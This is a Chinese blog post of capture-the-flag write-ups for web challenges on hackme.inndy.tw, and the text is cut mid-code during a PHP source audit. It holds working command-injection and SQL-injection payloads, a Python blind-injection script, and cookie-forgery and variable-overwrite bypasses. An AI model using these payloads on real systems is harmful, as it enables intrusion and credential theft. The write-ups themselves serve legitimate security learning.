都可以实现执行命令的作用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hackme.inndy.tw/ping/?ip=$(ls -a)</span><br></pre></td></tr></table></figure>\n<p>然后访问flag.php文件，因为题目过滤flag和php关键字，还有cat等命令，我们可以尝试</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://hackme.inndy.tw/ping/?ip=$(tac *.*)</span><br></pre></td></tr></table></figure>\n<h1 id=\"scoreboard\"><a href=\"#scoreboard\" class=\"headerlink\" title=\"scoreboard\"></a>scoreboard</h1><p>f12查看点击网络，查看一下消息头即可看到flag</p>\n<h1 id=\"login-as-admin-0\"><a href=\"#login-as-admin-0\" class=\"headerlink\" title=\"login as admin 0\"></a>login as admin 0</h1><p>题目主要源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span>(<span class=\"string\">'config.php'</span>);</span><br><span class=\"line\"><span class=\"comment\">// table schema</span></span><br><span class=\"line\"><span class=\"comment\">// user -&gt; id, user, password, is_admin</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>($_GET[<span class=\"string\">'show_source'</span>] === <span class=\"string\">'1'</span>) &#123;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe_filter</span><span class=\"params\">($str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $strl = strtolower($str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strstr($strl, <span class=\"string\">'or 1=1'</span>) || strstr($strl, <span class=\"string\">'drop'</span>) ||</span><br><span class=\"line\">        strstr($strl, <span class=\"string\">'update'</span>) || strstr($strl, <span class=\"string\">'delete'</span>)</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace(<span class=\"string\">\"'\"</span>, <span class=\"string\">\"\\\\'\"</span>, $str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_POST = array_map(safe_filter, $_POST);</span><br><span class=\"line\">$user = <span class=\"keyword\">null</span>;</span><br><span class=\"line\"><span class=\"comment\">// connect to database</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'name'</span>]) &amp;&amp; !<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'password'</span>])) &#123;</span><br><span class=\"line\">    $connection_string = sprintf(<span class=\"string\">'mysql:host=%s;dbname=%s;charset=utf8mb4'</span>, DB_HOST, DB_NAME);</span><br><span class=\"line\">    $db = <span class=\"keyword\">new</span> PDO($connection_string, DB_USER, DB_PASS);</span><br><span class=\"line\">    $sql = sprintf(<span class=\"string\">\"SELECT * FROM `user` WHERE `user` = '%s' AND `password` = '%s'\"</span>,</span><br><span class=\"line\">        $_POST[<span class=\"string\">'name'</span>],</span><br><span class=\"line\">        $_POST[<span class=\"string\">'password'</span>]</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        $query = $db-&gt;query($sql);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($query) &#123;</span><br><span class=\"line\">            $user = $query-&gt;fetchObject();</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            $user = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span>(<span class=\"keyword\">Exception</span> $e) &#123;</span><br><span class=\"line\">        $user = <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>本题是一道sql注入题目，要求我们以admin身份登录，题目过滤部分如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">safe_filter</span><span class=\"params\">($str)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $strl = strtolower($str);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (strstr($strl, <span class=\"string\">'or 1=1'</span>) || strstr($strl, <span class=\"string\">'drop'</span>) ||</span><br><span class=\"line\">        strstr($strl, <span class=\"string\">'update'</span>) || strstr($strl, <span class=\"string\">'delete'</span>)</span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">''</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str_replace(<span class=\"string\">\"'\"</span>, <span class=\"string\">\"\\\\\\\\'\"</span>, $str);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$_</span><br></pre></td></tr></table></figure>\n<p>可以看到，题目过滤了 <code>or 1=1</code> 等字符，还会用反斜杠转义单引号，漏洞点就在于本题只转义引号，不转义其它字符，所以我们可以考虑用自己提交的反斜杠转义掉引号前面的反斜杠，这样引号就被脱出来了，于是我们可以成功闭合，另外由于题目转义了引号，我们在构造admin登录的时候，可以使用16进制绕过，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">name&#x3D;guest\\&#39; or user&#x3D;0x61646d696e-- +&amp;password&#x3D;guest</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-0-1\"><a href=\"#login-as-admin-0-1\" class=\"headerlink\" title=\"login as admin 0.1\"></a>login as admin 0.1</h1><p>上个题目的加强版，直接union注入即可，最终payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">name&#x3D;guest\\&#39;  union select 1,the_f14g,3,3 from h1dden_f14g-- +&amp;password&#x3D;123465</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-1\"><a href=\"#login-as-admin-1\" class=\"headerlink\" title=\"login as admin 1\"></a>login as admin 1</h1><p>题目过滤并不严格，payload如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">admin\\&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1#</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-1-2\"><a href=\"#login-as-admin-1-2\" class=\"headerlink\" title=\"login as admin 1.2\"></a>login as admin 1.2</h1><p>上一题的加强版，需要进行盲注，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">url = <span class=\"string\">\"https://hackme.inndy.tw/login1/index.php\"</span></span><br><span class=\"line\">length = <span class=\"number\">1</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))=&#123;&#125;)#\"</span></span><br><span class=\"line\"><span class=\"comment\"># database:login_as_admin1</span></span><br><span class=\"line\"><span class=\"comment\"># payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;)#\"</span></span><br><span class=\"line\"><span class=\"comment\"># tables: 0bdb54c98123f5526ccaed982d2006a9,users</span></span><br><span class=\"line\"><span class=\"comment\"># payload1 = r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x3062646235346339383132336635353236636361656439383264323030366139),&#123;&#125;,1))=&#123;&#125;)#\"</span></span><br><span class=\"line\"><span class=\"comment\"># id,4a391a11cfa831ca740cf8d00782f3a6</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload1 = <span class=\"string\">r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr((select/**/group_concat(4a391a11cfa831ca740cf8d00782f3a6)/**/from/**/0bdb54c98123f5526ccaed982d2006a9),&#123;&#125;,1))=&#123;&#125;)#\"</span>\t</span><br><span class=\"line\">data = &#123;<span class=\"string\">'name'</span>:<span class=\"string\">r\"guest\\'/**/union/**/select/**/1=7,2=5,3=9,(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)#\"</span>, <span class=\"string\">'password'</span>:<span class=\"string\">\"123\"</span>&#125;</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">70</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">\t\tdata[<span class=\"string\">'name'</span>] = payload1.format(str(length),str(j))</span><br><span class=\"line\">\t\tcontent = requests.post(url,data=data).text</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"string\">\"FLAG\"</span> <span class=\"keyword\">in</span> content:</span><br><span class=\"line\">\t\t\tflag += chr(j)</span><br><span class=\"line\">\t\t\tprint(<span class=\"string\">'**flag:**'</span>,flag)</span><br><span class=\"line\">\t\t\tlength += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-3\"><a href=\"#login-as-admin-3\" class=\"headerlink\" title=\"login as admin 3\"></a>login as admin 3</h1><p>题目要求我们以admin身份登录，漏洞点在于验证登录时的判断使用了 <code>!=</code> ，这就存在弱比较的漏洞</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">load_user</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $secret, $error;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">empty</span>($_COOKIE[<span class=\"string\">'user'</span>])) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $unserialized = json_decode(base64_decode($_COOKIE[<span class=\"string\">'user'</span>]), <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    $r = hash_hmac(<span class=\"string\">'sha512'</span>, $unserialized[<span class=\"string\">'data'</span>], $secret) != $unserialized[<span class=\"string\">'sig'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(hash_hmac(<span class=\"string\">'sha512'</span>, $unserialized[<span class=\"string\">'data'</span>], $secret) != $unserialized[<span class=\"string\">'sig'</span>]) &#123;</span><br><span class=\"line\">        $error = <span class=\"string\">'Invalid session'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $data = json_decode($unserialized[<span class=\"string\">'data'</span>], <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> [</span><br><span class=\"line\">        <span class=\"string\">'name'</span> =&gt; $data[<span class=\"number\">0</span>],</span><br><span class=\"line\">        <span class=\"string\">'admin'</span> =&gt; $data[<span class=\"number\">1</span>]</span><br><span class=\"line\">    ];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>我们只要使$unserialized[‘sig’]的值为数字0即可绕过验证</p>\n<p>那么我们构造一个cookie</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">set_user</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> $user, $secret;</span><br><span class=\"line\">    $user = [<span class=\"string\">'admin'</span>, <span class=\"keyword\">true</span>];</span><br><span class=\"line\">    $data = json_encode($user);</span><br><span class=\"line\">    $sig = <span class=\"number\">0</span>;</span><br><span class=\"line\">    $all = base64_encode(json_encode([<span class=\"string\">'sig'</span> =&gt; $sig, <span class=\"string\">'data'</span> =&gt; $data]));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> $all;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> set_user();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>然后刷新即可</p>\n<h1 id=\"login-as-admin-4\"><a href=\"#login-as-admin-4\" class=\"headerlink\" title=\"login as admin 4\"></a>login as admin 4</h1><p>题目存在逻辑漏洞，重定向之后并没有exit，所以导致最终的判断被执行，所以我们只需要提交name为admin即可</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -d <span class=\"string\">\"name=admin\"</span> https://hackme.inndy.tw/login4/</span><br></pre></td></tr></table></figure>\n<h1 id=\"Login-as-Admin-6\"><a href=\"#Login-as-Admin-6\" class=\"headerlink\" title=\"Login as Admin 6\"></a>Login as Admin 6</h1><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span>(!<span class=\"keyword\">empty</span>($_POST[<span class=\"string\">'data'</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        $data = json_decode($_POST[<span class=\"string\">'data'</span>], <span class=\"keyword\">true</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (<span class=\"keyword\">Exception</span> $e) &#123;</span><br><span class=\"line\">        $data = [];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    extract($data);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($users[$username] &amp;&amp; strcmp($users[$username], $password) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        $user = $username;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看代码可知存在变量覆盖漏洞，构造json数据即可</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">data=&#123;<span class=\"string\">\"users\"</span>:&#123;<span class=\"string\">\"admin\"</span>:<span class=\"string\">\"snow\"</span>&#125;,<span class=\"string\">\"username\"</span>:<span class=\"string\">\"admin\"</span>,<span class=\"string\">\"password\"</span>:<span class=\"string\">\"snow\"</span>&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"login-as-admin-7\"><a href=\"#login-as-admin-7\" class=\"headerlink\" title=\"login as admin 7\"></a>login as admin 7</h1><p>md5弱比较</p>\n<p><img src=\"/2020/09/13/hackme-1/2.png\" alt=\"payload\"></p>\n<h1 id=\"dafuq-manager-1\"><a href=\"#dafuq-manager-1\" class=\"headerlink\" title=\"dafuq-manager 1\"></a>dafuq-manager 1</h1><p>查看cookie可以发现 <strong><em>show_hidden</em></strong> 字段为 <strong><em>no</em></strong>，改为<strong><em>yes</em></strong>刷新即可得到flag</p>\n<h1 id=\"dafuq-manager-2\"><a href=\"#dafuq-manager-2\" class=\"headerlink\" title=\"dafuq-manager 2\"></a>dafuq-manager 2</h1><p>这是一道代码审计，这是我第一次做这种整个网站源码的审计，还是有点被惊到了，万事开头难，看了别人的思路，我也开始了自己的审计之路，题目要求我们以admin的身份登录查看flag</p>\n<p>推荐使用PHPstorm来审计这种代码，搜索定位函数和变量会方便一点，先查看入口文件index.php，找到了admin相关的部分</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">case</span> <span class=\"string\">\"admin\"</span>:</span><br><span class=\"line\">        <span class=\"keyword\">require</span> <span class=\"string\">\"./core/fun_admin.php\"</span>;</span><br><span class=\"line\">        show_admin($GLOBALS[<span class=\"string\">\"dir\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br></pre></td></tr></table></figure>\n<p>我们跟进fun_admin.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">show_admin</span><span class=\"params\">($dir)</span> </span>&#123;</span><br><span class=\"line\">    $pwd = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">2</span>) == <span class=\"number\">2</span>);</span><br><span class=\"line\">    $admin = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">4</span>) == <span class=\"number\">4</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!$GLOBALS[<span class=\"string\">\"require_login\"</span>]) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"miscnofunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">\"action2\"</span>])) $action2 = $GLOBALS[<span class=\"string\">'__GET'</span>][<span class=\"string\">\"action2\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">elseif</span> (<span class=\"keyword\">isset</span>($GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"action2\"</span>])) $action2 = $GLOBALS[<span class=\"string\">'__POST'</span>][<span class=\"string\">\"action2\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">else</span> $action2 = <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> ($action2) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"chpwd\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$pwd) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            changepwd($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"adduser\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            adduser($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"edituser\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            edituser($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"string\">\"rmuser\"</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            removeuser($dir);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">default</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!$pwd &amp;&amp; !$admin) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">            admin($admin, $dir);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>主要的限制条件在于</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$pwd = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">2</span>) == <span class=\"number\">2</span>);</span><br><span class=\"line\">$admin = (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">4</span>) == <span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure>\n<p>我们跟进这个变量看一下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">activate_user</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">    $data = find_user($user, $pass);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($data == <span class=\"keyword\">NULL</span>) <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">'__SESSION'</span>][<span class=\"string\">\"s_user\"</span>] = $data[<span class=\"number\">0</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">'__SESSION'</span>][<span class=\"string\">\"s_pass\"</span>] = $data[<span class=\"number\">1</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"home_dir\"</span>] = $data[<span class=\"number\">2</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"home_url\"</span>] = $data[<span class=\"number\">3</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"show_hidden\"</span>] = $data[<span class=\"number\">4</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"no_access\"</span>] = $data[<span class=\"number\">5</span>];</span><br><span class=\"line\">    $GLOBALS[<span class=\"string\">\"permissions\"</span>] = $data[<span class=\"number\">6</span>];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再定位到find_user()</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> &amp;<span class=\"title\">find_user</span><span class=\"params\">($user, $pass)</span> </span>&#123;</span><br><span class=\"line\">    $cnt = count($GLOBALS[<span class=\"string\">\"users\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>;$i &lt; $cnt;++$i) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($user == $GLOBALS[<span class=\"string\">\"users\"</span>][$i][<span class=\"number\">0</span>]) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ($pass == <span class=\"keyword\">NULL</span> || ($pass == $GLOBALS[<span class=\"string\">\"users\"</span>][$i][<span class=\"number\">1</span>] &amp;&amp; $GLOBALS[<span class=\"string\">\"users\"</span>][$i][<span class=\"number\">7</span>])) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> $GLOBALS[<span class=\"string\">\"users\"</span>][$i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到data来自于全局变量users中，那么我们在追踪到.htusers.php中的users变量    </p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">$GLOBALS[<span class=\"string\">\"users\"</span>] = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">    <span class=\"keyword\">array</span>(<span class=\"string\">\"guest\"</span>, <span class=\"string\">\"084e0343a0486ff05530df6c705c8bb4\"</span>, <span class=\"string\">\"./data/guest\"</span>, <span class=\"string\">\"https://game1.security.ntu.st/data/guest\"</span>, <span class=\"number\">0</span>, <span class=\"string\">\"^.ht\"</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>),</span><br><span class=\"line\">);</span><br></pre></td></tr></table></figure>\n<p>但是源代码泄露只给出guest的信息，而没有admin的信息，所以我们可以考虑尝试读取该PHP文件的内容，所以我们可以在代码中查找文件读取相关的的函数</p>\n<p>在fun_down.php文件中可以找到一个readfile()函数</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> (<span class=\"string\">'core/secure.php'</span>);</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">download_item</span><span class=\"params\">($dir, $item)</span> </span>&#123;</span><br><span class=\"line\">    $item = basename($item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $abs_item = get_abs_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class=\"string\">'.php'</span>) || stristr($abs_item, <span class=\"string\">'config'</span>)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $browser = id_browser();</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Type: '</span> . (($browser == <span class=\"string\">'IE'</span> || $browser == <span class=\"string\">'OPERA'</span>) ? <span class=\"string\">'application/octetstream'</span> : <span class=\"string\">'application/octet-stream'</span>));</span><br><span class=\"line\">    header(<span class=\"string\">'Expires: '</span> . gmdate(<span class=\"string\">'D, d M Y H:i:s'</span>) . <span class=\"string\">' GMT'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Transfer-Encoding: binary'</span>);</span><br><span class=\"line\">    header(<span class=\"string\">'Content-Length: '</span> . filesize($abs_item));</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($browser == <span class=\"string\">'IE'</span>) &#123;</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Disposition: attachment; filename=\"'</span> . $item . <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Pragma: public'</span>);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        header(<span class=\"string\">'Content-Disposition: attachment; filename=\"'</span> . $item . <span class=\"string\">'\"'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Cache-Control: no-cache, must-revalidate'</span>);</span><br><span class=\"line\">        header(<span class=\"string\">'Pragma: no-cache'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    @readfile($abs_item);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>题目过滤部分如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"fileexist\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_show_item($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br><span class=\"line\">    $abs_item = get_abs_item($dir, $item);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!file_in_web($abs_item) || stristr($abs_item, <span class=\"string\">'.php'</span>) || stristr($abs_item, <span class=\"string\">'config'</span>)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfile\"</span>]);</span><br></pre></td></tr></table></figure>\n<p>我们要读取的是 <code>.config/.htusers.php</code> ，但是在题目的 <code>stristr($abs_item, &#39;.php&#39;) || stristr($abs_item, &#39;config&#39;)</code> 过滤了config和php两个字段，显然无法读取，只得在看看其他的函数，在fun_edit.php中</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">edit_file</span><span class=\"params\">($dir, $item)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (($GLOBALS[<span class=\"string\">\"permissions\"</span>] &amp; <span class=\"number\">01</span>) != <span class=\"number\">01</span>) show_error($GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span class=\"string\">\"accessfunc\"</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!get_is_file($dir, $item)) show_error($item . <span class=\"string\">\": \"</span> . $GLOBALS[<span class=\"string\">\"error_msg\"</span>][<span 